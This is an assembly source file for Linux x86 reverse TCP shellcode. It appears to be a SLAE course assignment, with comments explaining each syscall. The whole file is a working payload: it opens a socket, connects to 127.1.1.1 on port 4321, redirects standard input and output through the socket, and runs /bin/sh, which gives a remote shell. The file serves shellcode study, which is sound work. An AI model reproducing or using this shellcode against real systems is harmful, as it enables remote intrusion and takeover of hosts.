;
; Author 	: Rizal Muhammed (UB3RSiCK)
; Description	: SLAE x86 Assignment 2 - Shell Reverse TCP Shellcode (Linux/x86)
; File 		: shell-rev-tcp.nasm
; Website	: https://ub3rsick.github.io/

global _start

section .text

	_start:
		; int socketcall(int call, unsigned long *args)
						; socketcall - socket system calls
						; call determines which socket function to invoke
						; args points to a block containing the actual arguments, which are passed through to the appropriate call.
						
		; int socket(int domain, int type, int protocol); 
						; [/usr/include/linux/net.h] 
						; [#define SYS_SOCKET 1] [sys_socket(2)]

		; domain 	= AF_INET	; [/usr/include/i386-linux-gnu/bits/socket.h] 
						; [#define AF_INET PF_INET]
						; [#define PF_INET 2]
						; [IP protocol family]	 

		; type 		= SOCK_STREAM	; [/usr/include/i386-linux-gnu/bits/socket.h]
						; [SOCK_STREAM = 1]
						; [Sequenced, reliable, connection-based byte streams]

		; protocol 	= IP_PROTO	; [/usr/include/linux/in.h] 
						; [IPPROTO_IP = 0]
						; [Dummy protocol for TCP]
		; sockfd = socket(2, 1, 0)

		; EAX = 0x66 			; sys_socketcall()
		; EBX = 0x1			; sys_socket()
		; ECX = Pointer to sys_socket arguments

		xor eax, eax
		push eax			; Argument 3 for socket() =>  	IPPROTO_IP = 0
		mov al, 0x66
		
;		xor ebx, ebx
;		mov bl, 0x1

		push byte 0x1
		pop ebx
		
		push byte 0x1			; Argument 2 for socket() => 	SOCK_STREAM = 1
		push byte 0x2			; Argument 1 for socket() => 	AF_INET	= 2	
		
		; Now we have arguments for socket() in the stack. ESP points to them.
		
		mov ecx, esp
		int 0x80			; returns socket file descriptor to EAX

		push eax						
		pop esi				; clears esi and saves sockfd in esi

		;********************************************************************************;
		; connect to localhost:port with sys_connect
		; #define SYS_CONNECT	3		/* sys_connect(2)		*/
		; 
		
		; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

		; EAX = 0x66 = sys_socketcall()
		; EBX = 0x3  = sys_connect()
		; ECX = pointer to arguments of sys_connect

		; connect(sockfd, *ptr->[2, 0xe110, 0x0101017f], 16)

		mov al, 0x66
		pop ebx			; EBX = 2 now
		
		push 0x0101017f		; 127.1.1.1 Network byte order
		push word 0xe110	; port 4321
		push word bx		; AF_INET = 2

		mov ecx, esp		; ecx now points to struct sockaddr
		push 0x10		; addrlen = 16
		push ecx		; pointer to sockaddr
		push esi		; sockfd

		mov ecx, esp		; pointer to sys_connect args
		inc ebx			; EBX  = 3 ; sys_connect

		int 0x80

		xchg ebx, esi		; old sockfd in ebx for dup2		
		;********************************************************************************;
		; Redirect srdin, stdout, stderr with sys_dup2
		; int dup2(int oldfd, int newfd);
		; sys_dup2 = 0x3f

		xor eax, eax
		xor ecx, ecx
		mov cl,0x2

		dup_loop:
			mov al, 0x3f
			int 0x80
			dec ecx
			jns dup_loop

		;********************************************************************************;
		; execve /bin/sh
		
		xor eax, eax
		push eax		; push null onto stack
		mov al, 0x0b
		
		push 0x68732f2f
		push 0x6e69622f

		mov ebx, esp
		xor ecx, ecx
		xor edx, edx

		int 0x80


